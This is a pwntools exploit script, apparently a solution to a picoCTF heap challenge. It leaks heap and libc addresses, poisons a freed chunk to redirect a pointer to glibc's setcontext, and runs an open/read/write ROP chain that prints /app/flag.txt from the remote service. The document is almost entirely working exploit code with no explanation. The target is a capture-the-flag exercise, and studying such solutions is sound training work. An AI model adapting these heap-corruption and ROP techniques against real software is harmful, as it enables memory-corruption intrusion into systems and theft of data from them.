from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'mars.picoctf.net'
PORT = 31638
# HOST = '172.17.0.2'
# PORT = 9999

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		# return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"../../libc-database/libs/libc6_2.27-3ubuntu1.4_amd64/libc.so.6"})
		# return process(TARGET, env={"LD_LIBRARY_PATH":"../../libc-database/libs/libc6_2.27-3ubuntu1.4_amd64/"})
		return process(["../../libc-database/libs/libc6_2.27-3ubuntu1.4_amd64/ld-2.27.so", TARGET], env={"LD_PRELOAD":"../../libc-database/libs/libc6_2.27-3ubuntu1.4_amd64/libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [0x134d])

def a(idx, v):
	r.sendlineafter('choice: \n', '0')
	r.sendline(str(idx))
	r.sendlineafter(')? \n', str(v))

def setname(idx, size, name):
	r.sendlineafter('choice: \n', '1')
	r.sendline(str(idx))
	r.sendline(str(size))
	for n in name:
		r.sendline(str(ord(n)))

def show(idx):
	r.sendlineafter('choice: \n', '2')
	r.sendline(str(idx))
	
def vf(idx):
	r.sendlineafter('choice: \n', '3')
	r.sendline(str(idx))
def d(idx):
	r.sendlineafter('choice: \n', '4')
	r.sendline(str(idx))

for i in range(0x2):
	a(i, 0)
	setname(i, 0x0, '')
	show(i)

a(0, 0)
setname(0, 0x0, '')
show(0)
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
heap = leak - 0x13580
dbg('heap')
if args.R:
	rop = heap + 0x16360 -0x40
else:
	rop = heap + 0x15720

a(0, 0)
setname(0, 0x0, '')
show(0)
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
base = leak - 0x3ebcb0
dbg('base')

'''
check = base + 0x1bb7a0
a(0, 0)
a(1, 0)
d(1)
setname(0, 0x10, flat(0, check))
show(1)
r.interactive()
r.close()
'''
# pause()

if 1:
	setcontext = base + 0x521b5
else:
	setcontext = base + 0x52145

if 1:
	syscall = base + 0x000d2745
	rax = base + 0x00043ae7
	rdx = base + 0x00001b96
	rsi = base + 0x001542bc
	rdi = base + 0x0015c28f
	save_rax = base + 0x0008fbe7
else:
	syscall = base + 0x000d29d5
	rax = base + 0x00043a77
	rdx = base + 0x00001b96
	rsi = base + 0x001542bb
	rdi = base + 0x0016426a
ret = rdi+1

chunk_size = 0xb8
for i in range(8):
	a(0, 1)
	payload = ''
	payload = payload.ljust(chunk_size, '\x00')
	setname(0, chunk_size, payload)

a(1, 1)
payload = ''
payload += flat(0x21, 0x22, 0x23, 0x24,0x25,0x26, 0x27, 0x28, 0x29, 0x2a)
payload += flat(0x121, 0x122, 0x123, 0x124,0x125,0x126, rop, ret, 0x129, 0x12a)
payload += flat(0x1121, 0x1122, 0x1123)
payload = payload.ljust(chunk_size, '\x45')
setname(1, chunk_size, payload)
d(1)
setname(0, 0x10, flat(heap + 0x12e90+8, setcontext))

filename = "/app/flag.txt\x00"
a(2, 1)
payload = ''
payload += flat(rax, 2, rdi, rop+0x3e0, rsi, 0, rdx, 0, syscall)
# payload += flat(rdx, rop+8, save_rax)
payload += flat(rax, 0, rdi, 3, rsi, rop, rdx, 0x100, syscall)
payload += flat(rax, 1, rdi, 1, rsi, rop, rdx, 0x400, syscall)
payload = payload.ljust(0x3e0, '\x00')
payload += filename
payload = payload.ljust(0x400, '\x00')
assert(len(payload) == 0x400)
setname(2, len(payload), payload)
context.log_level = 'debug'
vf(1)

r.interactive()
r.close()
